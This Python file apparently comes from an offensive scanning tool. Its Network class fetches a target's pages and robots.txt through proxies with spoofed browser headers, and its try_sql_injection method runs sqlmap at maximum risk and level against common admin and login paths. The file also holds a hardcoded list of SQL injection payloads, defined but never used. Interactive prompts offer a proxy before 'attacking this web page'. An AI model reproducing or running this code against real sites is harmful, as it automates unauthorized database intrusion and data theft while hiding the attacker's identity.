import requests

from sqlmap import sqlmap
from helper import *

class Network:
    def __init__(self):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }
        
    def get_content(self, address, proxy, d_ipv4):
        try:
            if d_ipv4 and bool(re.match(d_ipv4, address)):
                address = get_domain(address)
            r = requests.get(f"http://{address}", headers=self.headers, proxies=proxy.proxy)
            if r.status_code == 200:
                print(f"\n{r.content.strip()}")
            else:
                print(f"There was an error while to fetch the content of {address}, code: {r.status_code}")
        except requests.exceptions.SSLError:
            print(f"An SSL error occourred while trying to fetch the content of {address}")
            
    def get_robots(self, target, proxy):
        try:
            r = requests.get(f"http://{target}/robots.txt", headers=self.headers, proxies=proxy.proxy)
            if "404" not in r.text:
                print(f"\n{r.text}")
            else:
                print(f"Unable to fetch robots.txt: file not found in {target}")
        except requests.exceptions.MissingSchema:
            print(f"Unable to fetch robots.txt: file not found in {target}")

    def try_sql_injection(self, target, proxy):
        extensions = ["", ".html", ".htm", ".asp", ".aspx", ".jsp", ".php", ".jspx"]
        directories = ["", "admin", "login", "wp-admin", "cms", "panel", "dashboard", "config", "includes"]
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT * FROM users --",
            "' AND 1=1 --",
            "' OR 1=1 --",
            "1' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "1' AND 1=1 --",
            "1' OR '1'='1 --",
            "1' OR 1=1 --"
        ]

        successfull = False
        for d in directories:
            for ext in extensions:
                url = f"{target}/{d}{ext}"
                try:
                    sqlmap_instance = sqlmap.sqlmap()
                    sqlmap_instance.set_url(f"http://{url}?id=1")

                    sqlmap_instance.set_risk(3)
                    sqlmap_instance.set_level(5)
                    sqlmap_instance.set_random_agent(True)
                    sqlmap_instance.set_batch(True)
                    sqlmap_instance.set_output_dir("sqlmap_output")
                    sqlmap_instance.set_proxy(proxy.proxy)

                    sqlmap_instance.run()
                    print(sqlmap_instance.get_output())
                    successfull = True

                except Exception as e:
                   continue
               
        if not successfull:
            print(f"\nNone of the sql injection attempts on {target} worked")
                
    def att_port_80(self, target, proxy):            
        choice = input(f"\nPort 80 is open, do you want to fetch the contents of {target}, which is hosted on this ip? [y/n] ")
        if choice == "y":
            if not proxy.proxy:
                p_choice = input("\nYou have no active proxy, do you want to use one before attacking this web page? [y/n] ")
                if p_choice == "y":
                    proxy.get_proxy()
            self.get_content(target, proxy, d_ipv4=None)
    
        choice_2 = input(f"\nDo you want to try and fetch the robots.txt file from {target}? [y/n] ")
        if choice_2 == "y":
            self.get_robots(target, proxy)
            
        choice_3 = input(f"\nDo you want to try common sql injection payloads on {target}? [y/n] ")
        if choice_3 == "y":
            self.try_sql_injection(target, proxy)